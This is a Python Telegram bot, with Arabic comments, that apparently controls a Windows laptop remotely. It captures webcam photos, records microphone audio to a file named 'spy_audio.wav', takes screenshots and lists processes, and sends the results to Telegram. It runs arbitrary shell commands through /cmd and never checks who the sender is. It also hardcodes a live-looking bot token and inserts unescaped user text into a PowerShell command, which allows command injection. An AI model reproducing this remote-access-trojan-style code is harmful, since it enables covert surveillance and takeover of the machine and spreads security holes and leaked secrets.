import os
import socket
import platform
import subprocess
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# ضع التوكن الخاص بك هنا
TOKEN = "9080842144:AAGkUW-HpSEDLLIpt3vF852rHF9CX1ITIIo"

# دالة إرسال إشعار الإقلاع التلقائي عند فتح الجهاز
async def send_startup_notification(application):
    chat_id = application.bot_data.get('chat_id')
    if chat_id:
        try:
            hostname = socket.gethostname()
            await application.bot.send_message(
                chat_id=chat_id, 
                text=f"🚀 **تنبيه نظام:** اللابتوب (`{hostname}`) تم تشغيله واتصل بالإنترنت بنجاح وهو جاهز للتحكم التام الآن!"
            )
        except Exception as e:
            print(f"فشل إرسال تنبيه الإقلاع: {e}")

# أمر البدء وعرض لوحة التحكم الكاملة والعملاقة
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.bot_data['chat_id'] = update.effective_chat.id
    
    keyboard = [
        [
            InlineKeyboardButton("💤 سكون", callback_data='sleep'),
            InlineKeyboardButton("🔴 إيقاف", callback_data='shutdown'),
            InlineKeyboardButton("🔄 ريستارت", callback_data='restart')
        ],
        [
            InlineKeyboardButton("🔒 قفل الشاشة", callback_data='lock_screen'),
            InlineKeyboardButton("🔊 كتم / إلغاء", callback_data='toggle_mute')
        ],
        [
            InlineKeyboardButton("▶️ تشغيل / إيقاف ميديا", callback_data='media_play_pause'),
            InlineKeyboardButton("🎚️ رفع الصوت", callback_data='vol_up')
        ],
        [
            InlineKeyboardButton("📸 لقطة شاشة", callback_data='screenshot'),
            InlineKeyboardButton("📷 كاميرا الويب", callback_data='webcam')
        ],
        [
            InlineKeyboardButton("🎙️ تسجیل صوتي", callback_data='record_audio'),
            InlineKeyboardButton("💬 رسالة للشاشة", callback_data='msg_guide')
        ],
        [
            InlineKeyboardButton("🔋 البطارية", callback_data='battery_info'),
            InlineKeyboardButton("🌐 الشبكة", callback_data='net_info')
        ],
        [
            InlineKeyboardButton("⚙️ العمليات الجارية", callback_data='processes'),
            InlineKeyboardButton("💻 معلومات النظام", callback_data='sys_info')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "أهلاً بك يا بكر في لوحة التحكم المركزية (الإصدار الأسطوري الشامل) 🚀\nاختر الأمر الذي تريده:",
        reply_markup=reply_markup
    )

# مركز معالجة الأزرار والطلبات
async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == 'sleep':
        await query.edit_message_text(text="💤 جاري إدخال اللابتوب في وضع السكون...")
        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        
    elif data == 'shutdown':
        await query.edit_message_text(text="🔴 جاري إيقاف تشغيل اللابتوب بالكامل...")
        os.system("shutdown /s /t 0")
        
    elif data == 'restart':
        await query.edit_message_text(text="🔄 جاري إعادة تشغيل اللابتوب...")
        os.system("shutdown /r /t 0")
        
    elif data == 'lock_screen':
        await query.edit_message_text(text="🔒 تم قفل شاشة اللابتوب بنجاح!")
        os.system("rundll32.exe user32.dll,LockWorkStation")
        
    elif data == 'toggle_mute':
        try:
            import pyautogui
            pyautogui.press('volumemute')
            await query.edit_message_text(text="🔊 تم تبديل حالة صوت اللابتوب (كتم/إلغاء الكتم).")
        except Exception as e:
            await query.edit_message_text(text=f"فشل التحكم بالصوت: {e}")
            
    elif data == 'media_play_pause':
        try:
            import pyautogui
            pyautogui.press('playpause')
            await query.edit_message_text(text="▶️ تم إرسال أمر تشغيل/إيقاف للميديا.")
        except Exception as e:
            await query.edit_message_text(text=f"فشل التحكم بالميديا: {e}")

    elif data == 'vol_up':
        try:
            import pyautogui
            pyautogui.press('volumeup')
            await query.edit_message_text(text="🎚️ تم رفع مستوى الصوت خطوة.")
        except Exception as e:
            await query.edit_message_text(text=f"فشل رفع الصوت: {e}")
            
    elif data == 'battery_info':
        try:
            battery_output = subprocess.check_output(
                "powershell -command \"Get-CimInstance Win32_Battery | Select-Object EstimatedChargeRemaining, BatteryStatus\"", 
                shell=True
            ).decode('utf-8', errors='ignore')
            await query.edit_message_text(text=f"🔋 **حالة البطارية:**\n```\n{battery_output}\n```", parse_mode='Markdown')
        except Exception as e:
            await query.edit_message_text(text=f"⚠️ تعذر قراءة معلومات البطارية: {e}")
            
    elif data == 'webcam':
        await query.edit_message_text(text="📷 جاري التقاط صورة من كاميرا الويب...")
        try:
            import cv2
            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if not cam.isOpened():
                raise Exception("تعذر فتح الكاميرا، تأكد من أنها غير مستخدمة من برنامج آخر.")
            
            ret, frame = cam.read()
            if ret:
                img_path = "webcam.jpg"
                cv2.imwrite(img_path, frame)
                cam.release()
                await context.bot.send_photo(chat_id=query.message.chat_id, photo=open(img_path, 'rb'), caption="📷 صورة فورية من كاميرا اللابتوب:")
                os.remove(img_path)
            else:
                cam.release()
                await query.edit_message_text(text="⚠️ فشل التقاط الإطار من الكاميرا.")
        except Exception as e:
            await query.edit_message_text(text=f"⚠️ خطأ في الكاميرا:\n`{e}`", parse_mode='Markdown')
            
    elif data == 'record_audio':
        await query.edit_message_text(text="🎙️ جاري تسجيل الصوت المحيط لمدة 5 ثوانٍ...")
        try:
            import sounddevice as sd
            import scipy.io.wavfile as wav
            import numpy as np
            
            duration = 5  
            fs = 16000  # خفض تردد العينات ليتوافق مع جميع أنواع المايكروفونات في ويندوز
            
            # تسجيل الصوت باستخدام الجهاز الافتراضي وبقنوات أحادية آمنة
            audio_data = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()  
            
            audio_path = "spy_audio.wav"
            wav.write(audio_path, fs, audio_data)
            
            await context.bot.send_audio(chat_id=query.message.chat_id, audio=open(audio_path, 'rb'), caption="🎙️ تسجيل صوتي من مايك اللابتوب:")
            os.remove(audio_path)
        except Exception as e:
            await query.edit_message_text(text=f"⚠️ خطأ في تسجيل الصوت:\n`{e}`", parse_mode='Markdown')

    elif data == 'msg_guide':
        await query.edit_message_text(text="💬 لإرسال رسالة تظهر على شاشة اللابتوب، اكتب الأمر في المحادثة هكذا:\n`/msg رسالتك هنا`", parse_mode='Markdown')

    elif data == 'net_info':
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        
        wifi_name = "غير معروف"
        try:
            output = subprocess.check_output("netsh wlan show interfaces", shell=True).decode('utf-8', errors='ignore')
            for line in output.split('\n'):
                if "SSID" in line and "BSSID" not in line:
                    wifi_name = line.split(":")[1].strip()
                    break
        except:
            pass
            
        net_text = f"🌐 **معلومات الشبكة والاتصال:**\n\nاسم الجهاز: `{hostname}`\nعنوان IP المحلي: `{IPAddr}`\nشبكة الواي فاي: `{wifi_name}`"
        await query.edit_message_text(text=net_text, parse_mode='Markdown')
        
    elif data == 'screenshot':
        await query.edit_message_text(text="📸 جاري التقاط الشاشة...")
        try:
            import pyautogui
            screenshot_path = "screen.png"
            pyautogui.screenshot(screenshot_path)
            await context.bot.send_photo(chat_id=query.message.chat_id, photo=open(screenshot_path, 'rb'), caption="📸 لقطة شاشة حية من اللابتوب:")
            os.remove(screenshot_path)
        except Exception as e:
            await query.edit_message_text(text=f"⚠️ حدث خطأ أثناء التقاط الشاشة: {e}")
            
    elif data == 'processes':
        await query.edit_message_text(text="⚙️ جاري جلب العمليات النشطة...")
        try:
            output = subprocess.check_output("tasklist", shell=True).decode('cp1256', errors='ignore')
            lines = output.split('\r\n')
            proc_list = "\n".join(lines[:15])
            await query.edit_message_text(text=f"⚙️ **أبرز العمليات والبرامج المفتوحة:**\n```\n{proc_list}\n```", parse_mode='Markdown')
        except Exception as e:
            await query.edit_message_text(text=f"فشل في جلب العمليات: {e}")
            
    elif data == 'sys_info':
        sys_text = f"💻 **معلومات نظام اللابتوب:**\n\nالنظام: {platform.system()} {platform.release()}\nالمعالج: {platform.processor()}"
        await query.edit_message_text(text=sys_text, parse_mode='Markdown')

# دالة إرسال رسالة منبثقة للشاشة عبر الأمر /msg
async def send_msg_to_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        message_text = " ".join(context.args)
        ps_command = f'powershell -command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show(\'{message_text}\', \'تنبيه من البوت الذكي\')"'
        subprocess.Popen(ps_command, shell=True)
        await update.message.reply_text(f"✅ تم إرسال الرسالة لتظهر على شاشة اللابتوب بنجاح: _{message_text}_", parse_mode='Markdown')
    else:
        await update.message.reply_text("⚠️ يرجى كتابة النص بعد الأمر هكذا:\n`/msg مرحباً يا بكر`", parse_mode='Markdown')

# دالة تنفيذ أوامر النظام المباشرة عبر الأمر /cmd
async def run_custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        cmd = " ".join(context.args)
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode('cp1256', errors='ignore')
            if len(result) > 3500:
                result = result[:3500] + "\n... (تم اقتطاع النتيجة لطولها)"
            await update.message.reply_text(f"💻 **نتيجة تنفيذ الأمر:**\n```\n{result}\n```", parse_mode='Markdown')
        except Exception as e:
            await update.message.reply_text(f"⚠️ فشل تنفيذ الأمر: {e}")
    else:
        await update.message.reply_text("⚠️ يرجى كتابة الأمر بعد /cmd هكذا:\n`/cmd ipconfig`", parse_mode='Markdown')

# إشعار ما بعد التشغيل
async def post_init(application):
    await send_startup_notification(application)

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).read_timeout(30).write_timeout(30).connect_timeout(30).post_init(post_init).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("msg", send_msg_to_screen))
    app.add_handler(CommandHandler("cmd", run_custom_command))
    app.add_handler(CallbackQueryHandler(button_click))
    
    print("البوت المتقدم الشامل يعمل الآن ومستعد...")
    app.run_polling()